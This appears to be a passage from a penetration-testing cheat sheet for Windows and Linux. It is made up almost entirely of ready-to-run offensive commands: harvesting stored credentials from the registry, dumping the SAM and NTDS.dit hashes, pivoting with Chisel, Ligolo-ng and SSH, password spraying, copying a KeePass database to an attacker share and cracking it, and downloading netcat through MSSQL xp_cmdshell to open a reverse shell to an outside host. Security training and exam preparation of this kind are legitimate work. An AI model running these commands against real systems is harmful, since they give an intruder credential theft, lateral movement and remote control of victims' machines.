reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" 
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

#RunAs - Savedcreds
cmdkey /list #Displays stored credentials looks for any optential users
#Transfer the reverseshell
runas /savecred /user:admin C:\Temp\reverse.exe
```

## Windows Privilege Escalation - Backup Operator
```bash
# Backup operator group  (whoami /priv)
# SeBackupPrivilege             Back up files and directories  Enabled
# SeRestorePrivilege            Restore files and directories  Enabled

1. mkdir C:\temp
2. reg save hklm\sam c:\Windows\Tasks\SAM
3. reg save hklm\sam c:\Windows\Tasks\SYSTEM
4. impacket-secretsdump -sam SAM -system SYSTEM LOCAL                                   Secretes Dump for sam and system

# complete methodology to steal NTDS with diskshadow: Make a file ntds.dsh on KALI 
# (MAKE WITH NANO)
# set context persistent nowriters
# add volume c: alias pwn
# create
# expose %pwn% z:
# (RUN THIS ON KALI)
# unix2dos ntds.dsh

# Transfer this ntds.dsh file to target. Then run this diskshadow command 
diskshadow /s ntds.dsh

# After this, I ran this. 
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system C:\temp\system.hive

# and I had ntds.dit copied to current directory.
impacket-secretsdump -ntds ntds.dit -system system.hive local 
```

## Tunneling & Pivoting - Chisel
```bash
# Setup
# Nano /etc/proxychains4.conf
# socks4         127.0.0.1 9050
# socks5         127.0.0.1 1080

# On kali
chisel server -p 9001 --reverse

# On victim
upload chisel.exe
./chisel.exe client 192.168.45.181:9001 R:socks
```

## Tunneling & Pivoting - Proxychains
```bash
sudo proxychains crackmapexec smb ip.txt -u username.txt -p 'Mushroom!' --continue-on-success
sudo proxychains crackmapexec winrm ip.txt -u username.txt -H hash   --continue-on-success
sudo proxychains crackmapexec smb ip.txt -u yoshi -p 'Mushroom!'   
sudo proxychains crackmapexec winrm ip.txt -u yoshi -p 'Mushroom!'
sudo proxychains evil-winrm -i 172.16.162.12 -u yoshi -p 'Mushroom!'
sudo proxychains nxc rdp ip.txt -u yoshi -p 'Mushroom!'  
sudo proxychains nxc rdp 172.16.162.82 -u yoshi -p Mushroom!    
sudo proxychains xfreerdp3 /v:172.16.162.12 /u:yoshi /p:Mushroom!

sudo proxychains nxc rdp ip.txt -u yoshi -p 'Mushroom!' --continue-on-success
sudo proxychains netexec rdp ip.txt -u yoshi -p 'Mushroom!' --continue-on-success

sudo proxychains impacket-psexec 'celia.almeda:7k8XHk3dMtmpnC7'@10.10.195.140 
```

## Tunneling & Pivoting - Ligolo-ng
```bash
#Kali machine - Attacker machine
ligolo-proxy -selfcert                               >>>>> open lingolo 
./proxy -laddr 0.0.0.0:9001 -selfcert
# ./proxy -laddr 0.0.0.0:1234 --to 0.0.0.0:4444 (Old syntax?)

#windows or linux machine - compromised machine
.\agent.exe -connect <LHOST>:9001 -ignore-cert

#In Ligolo-ng console
session                                                        #select host
ifconfig                                                       #Notedown the internal network's subnet
start                                                            #after adding relevent subnet to ligolo interface
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444

#Adding subnet to ligolo interface - Kali linux
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip r add <subnet> dev ligolo
```

## Tunneling & Pivoting - SSH Pivot
```bash
ssh adminuser@10.10.155.5 -i id_rsa -D 9050                                                                                          #TOR port

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"

proxychains4 crackmapexec smb 10.10.10.0/24                                               #Example
```

## File Transfer - Netcat
```bash
#Attacker
nc <target_ip> 1234                          < nmap

#Target
nc -lvp 1234 > nmap
```

## File Transfer - Windows Methods
```bash
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .

# SMB server
impacket-smbserver share . -smb2support
copy file.txt \\<YOUR_IP>\share\
# On victim
net use \\192.168.45.204\test /u:aa aa  
copy Database.kdbx \\192.168.45.204\test
```

## File Transfer - Linux Methods
```bash
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
python -m http.server 8001
```

## Database - MSSQL
```bash
nxc mssql <ip> -u <user> -p <pass> --no-pass
impacket-mssqlclient -port 1433 'user:pass'@$ip
impacket-mssqlclient -windows-auth domain/username:password@10.10.10.29
SQL> xp_cmdshell "whoami"

# Excute command
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@192.168.122.146 -windows-auth
SQL > xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://192.168.45.241/nc.exe -outfile nc.exe"
SQL > xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 192.168.45.241 4444"
```

## Post-Exploitation - Detailed
### General
```bash
#Powershell History
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat /home/user/.bash_history

#Processes
netstat -ano
Get-Process
ps aux
ps -ef

#Network
ip a
ip route
ipconfig /all
route print
arp -a
cat /etc/hosts
cat /etc/resolv.conf
nmcli dev show
```

### KDBX Files
```bash
#These are KeyPassX password-stored files
cmd> dir /s /b *.kdbx 
Ps> Get-ChildItem -Recurse -Filter *.kdbx
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue 

#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
#Use "KeePassXC" tool to open the database file using the obtained password
```

## Misc - Password Strategy
```bash
# Dealing with Passwords
# 	• When there's a scope for bruteforce or hash-cracking then try the following,
# 		○ Have a valid username first
# 		○ Don't forget trying admin:admin
# 		○ Try username:username as first credential
# 		○ If it's related to a service, try default passwords.
# 		○ The service name is the username, and the same name is used for the password.
# 		○ Use Rockyou.txt
# 	• Some default passwords to always try out!

# password
# password1
# Password1
# Password@123
# password@123
# admin
# administrator
# admin@123
```

## Misc - Cheats
```bash
echo "10.10.11.23  mailing.htb" >> /etc/hosts

searchsploit <name> <version>
searchsploit -m <id>

# Virtual env
source env/bin/activate
source venv/bin/activate

# shutdown
cmd.exe /c "shutdown /r /t 0"
```

usefull links

https://github.com/jakobfriedl/precompiled-binaries/tree/main
https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
https://gtfobins.github.io/
https://github.com/bugch3ck/SharpEfsPotato
https://swisskyrepo.github.io/InternalAllTheThings/
https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5
https://ph03n1x.net/ligolo-cheatsheet/
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
https://www.bordergate.co.uk/backup-operator-privilege-escalation/
https://github.com/Greenwolf/ntlm_theft
https://github.com/AtvikSecurity/CentralizedPotatoes
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://github.com/saisathvik1/OSCP-Cheatsheet


